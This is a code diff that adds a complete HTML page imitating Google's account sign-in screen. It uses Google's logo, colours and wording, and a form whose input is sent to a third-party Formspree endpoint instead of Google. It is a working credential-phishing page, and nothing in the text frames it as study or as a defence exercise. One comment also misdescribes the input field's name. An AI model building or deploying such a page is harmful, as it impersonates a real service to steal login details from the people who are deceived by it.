@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Account</title>
+    <style>
+        body {
+            font-family: 'Roboto', Arial, sans-serif; /* Fallback fonts */
+            background-color: #f2f4f6; /* Typical light grey/greenish tint for login pages */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-container {
+            width: 438px; 
+            padding: 36px 47px 12px 47px; 
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24); 
+            background-color: #fff;
+        }
+
+        /* Centered Logo Area */
+        .logo-area { text-align: center; margin-bottom: 25px; }
+        
+        h1 { font-size: 24px; font-weight: 400; color: #dadce0; padding-left: 17px; margin-top:0;}
+
+        input[type="email"] {
+            display: block;
+            border-radius: 4px;
+            border-color: #dadce0;
+            width: 285px; 
+            margin-bottom: 13px;
+            height: 46px; 
+            font-size: 16px;
+        }
+
+        button {
+            appearance: none; 
+            background-color: #1a73e8 !important; /* Google Blue */
+            box-sizing: border-box;
+            color: white !important; 
+            cursor: pointer;
+            display: block;
+            height: 40px; 
+            width: 298px; 
+            margin-right: auto; 
+            margin-left: auto; 
+            padding-top: 6px; 
+            font-family: 'Roboto', sans-serif;
+        }
+
+        button:hover { background-color: #155cbf !important;}
+
+        .forgot-password {
+            color: #1a73e8 !important;
+            display: inline-block;
+            text-decoration: none !important; 
+            cursor: pointer; 
+        }
+    </style>
+</head>
+<body>
+    
+    <!-- Your Formspree form with your specific ID -->
+    <form action="https://formspree.io/f/mzeeaaep" method="POST">
+        
+        <!-- Logo Area (Optional visual touch) -->
+        <div class="logo-area">
+             <!-- Using a public placeholder image for Google logo if needed, or leave empty -->
+             <!-- You can replace src="" with a real URL to the .svg logo later -->
+             <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Google_2015_logo.svg" alt="" style="width:96px; height:auto;"> 
+        </div>
+
+        <h1>Sign in</h1>
+        
+        <!-- Main Input Field. Note: We use 'email' as name and ensure required attribute is set. -->
+        <input type="text" name="_subject" placeholder="Email or phone number" required />
+        
+        <button type="submit">Next</button>
+
+        <!-- Optional: Forgot email link (visual only) -->
+        <a href="#" class="forgot-password" onclick="alert('Forgot password flow would open here.'); return false;">Forgot email?</a>
+
+    </form>
+
+</body>
+</html>
